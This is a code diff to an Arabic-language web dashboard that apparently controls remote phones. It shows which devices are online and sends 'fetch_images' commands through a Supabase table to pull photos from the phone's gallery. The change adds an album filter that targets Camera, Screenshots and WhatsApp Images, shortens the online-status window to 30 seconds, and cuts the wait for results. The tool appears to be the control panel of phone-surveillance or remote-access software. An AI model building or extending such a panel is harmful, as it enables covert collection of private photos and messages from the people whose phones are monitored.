@@ -55,12 +55,23 @@
             </div>
         </div>
 
-        <!-- 🖼️ قسم معرض وسائط الهاتف المختار -->
+        <!-- 🖼️ قسم معرض وسائط الهاتف المختار (مع تصفية الألبومات) -->
         <div class="bg-slate-800 p-6 rounded-xl border border-slate-700 shadow-lg mb-8">
             <div class="flex flex-col md:flex-row justify-between items-start md:items-center mb-4 gap-4">
                 <h2 class="text-lg font-semibold text-purple-400">🖼️ معرض وسائط الهاتف المختار</h2>
                 
-                <div class="flex items-center gap-3">
+                <div class="flex flex-wrap items-center gap-3">
+                    <!-- قائمة اختيار الألبومات -->
+                    <div class="flex items-center gap-2">
+                        <label class="text-xs text-slate-400">الألبوم:</label>
+                        <select id="bucketSelector" class="bg-slate-900 border border-slate-700 text-slate-200 text-xs rounded px-2 py-1.5 focus:outline-none focus:border-purple-500">
+                            <option value="All" selected>الكل (All Media)</option>
+                            <option value="Camera">الكاميرا (Camera)</option>
+                            <option value="Screenshots">لقطات الشاشة (Screenshots)</option>
+                            <option value="WhatsApp Images">واتساب (WhatsApp)</option>
+                        </select>
+                    </div>
+
                     <div class="flex items-center gap-2">
                         <label class="text-xs text-slate-400">العدد/صفحة:</label>
                         <select id="pageSizeSelector" class="bg-slate-900 border border-slate-700 text-slate-200 text-xs rounded px-2 py-1.5 focus:outline-none focus:border-purple-500">
@@ -156,7 +167,7 @@
 
                     data.forEach(device => {
                         const diffSeconds = Math.abs(Date.now() - device.last_seen) / 1000;
-                        const isOnline = diffSeconds <= 30;
+                        const isOnline = diffSeconds <= 30; // مهلة 30 ثانية لدقة الحالة
                         const statusIcon = isOnline ? '🟢' : '🔴';
                         const shortId = device.device_id.substring(0, 6) + '...';
                         
@@ -177,7 +188,7 @@
                     const selectedDeviceData = allDevices.find(d => d.device_id === activeDeviceId);
                     if (selectedDeviceData) {
                         const diffSeconds = Math.abs(Date.now() - selectedDeviceData.last_seen) / 1000;
-                        if (diffSeconds <= 600) {
+                        if (diffSeconds <= 30) {
                             statusEl.innerHTML = `🟢 متصل`;
                             statusEl.className = "text-xs px-3 py-2 rounded-lg bg-slate-900 border border-emerald-500 text-emerald-400 font-bold shadow";
                         } else {
@@ -301,15 +312,16 @@
             if (!activeDeviceId) return;
             currentImagePage = page;
             const selectedPageSize = parseInt(document.getElementById('pageSizeSelector').value) || 10;
+            const selectedBucket = document.getElementById('bucketSelector').value; // جلب الألبوم المختار
             
             document.getElementById('galleryPageIndicator').innerText = `الصفحة ${currentImagePage}`;
-            document.getElementById('galleryGrid').innerHTML = `<div class="col-span-full text-center py-6 text-amber-400 font-bold animate-pulse">جاري جمع الوسائط من الهاتف... يرجى الانتظار ⏳ (مهلة دقيقة)</div>`;
+            document.getElementById('galleryGrid').innerHTML = `<div class="col-span-full text-center py-6 text-amber-400 font-bold animate-pulse">جاري جمع الوسائط من الألبوم المختار... ⏳</div>`;
 
             await supabaseClient.from('device_commands').insert([
-                { device_id: activeDeviceId, action: 'fetch_images', page: currentImagePage, page_size: selectedPageSize }
+                { device_id: activeDeviceId, action: 'fetch_images', page: currentImagePage, page_size: selectedPageSize, bucket_name: selectedBucket }
             ]);
 
-            setTimeout(loadGalleryFromCache, 60000);
+            setTimeout(loadGalleryFromCache, 15000);
         }
 
         async function loadGalleryFromCache() {
